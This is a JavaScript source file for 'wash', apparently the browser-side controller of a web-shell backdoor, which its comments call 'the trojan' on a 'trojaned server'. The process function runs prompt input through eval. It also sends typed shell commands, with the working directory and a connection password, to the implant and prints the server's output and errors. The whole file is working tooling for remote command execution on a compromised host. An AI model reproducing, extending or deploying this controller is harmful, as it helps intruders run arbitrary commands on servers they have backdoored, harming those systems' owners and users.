// this is the top-level application object
var wash = {

    // stores the 'root' of the command being evaluated. I'd be tempted to store
    // this in wash.command.root, but that object is meant for travel between
    // the wash client and the trojan, and this information is worthless upstream.
    command_root: '',

    // stores the cwd on the trojaned server
    cwd: '',

    // store the version number (sometimes this is handy)
    version: '0.5.0',

    // processes commands on the wash prompt
    process: function(command){
        // parse out the wash action
        if(shell.prompt.mode.get() === 'wash'){
            // Process wash commands as pure JavaScript. This allows for
            // tremendous extensibility
            try{
                eval(command);
                if(shell.prompt.context.get() === ''){
                    shell.prompt.context.set('wash>');
                }
            }catch(e){
                shell.output.write('wash error: Invalid command.', 'output wash_error');
            }
        }
        
        // if the prompt is not in wash mode...
        else {

            // ... listen for command remaps
            if(shell.prompt.mode.get() === 'remap'){
                // execute the JavaScript callback function
                wash.remap[wash.command_root].callback(command);
                // remap the command
                command = wash.remap[wash.command_root].command;
                // if the command was remapped to boolean false, terminate.
                // Nothing needs to be done beyond firing the JavaScript
                // payload.
                if(command === false){
                    var context = (wash.response.output.prompt === undefined) ? 'wash>' : wash.response.output.prompt;
                    shell.prompt.context.set(context);
                    shell.prompt.draw();
                    return false;
                }
            }

            // ... and communicate with the trojan
            wash.command.action        = 'shell';
            wash.command.args.cmd      = command;
            wash.command.args.cwd      = wash.cwd;
            wash.command.args.password = wash.connection.password;

            wash.net.send(function(){  
                // display the output
                if(wash.response.output === undefined){
                    wash.response.output = {};
                    wash.response.output.prompt = 'wash>';
                }
                shell.prompt.context.set(wash.response.output.prompt);
                shell.prompt.draw();

                // do post-processing on the command output, if appropriate
                /*
                if(wash.post_processor[command_root] != null){
                    wash.post_processor[command_root]();
                }
                */

                // buffer the cwd
                wash.cwd = wash.response.output.cwd;

                // display output or error, depending on which was received
                if(wash.response.error !== undefined && wash.response.error !== ''){
                    shell.output.write(wash.response.error, 'output wash_error');
                }
                else { shell.output.write(wash.response.output.stdout, 'output ' + wash.command_root); }
            });
        }
    },
};
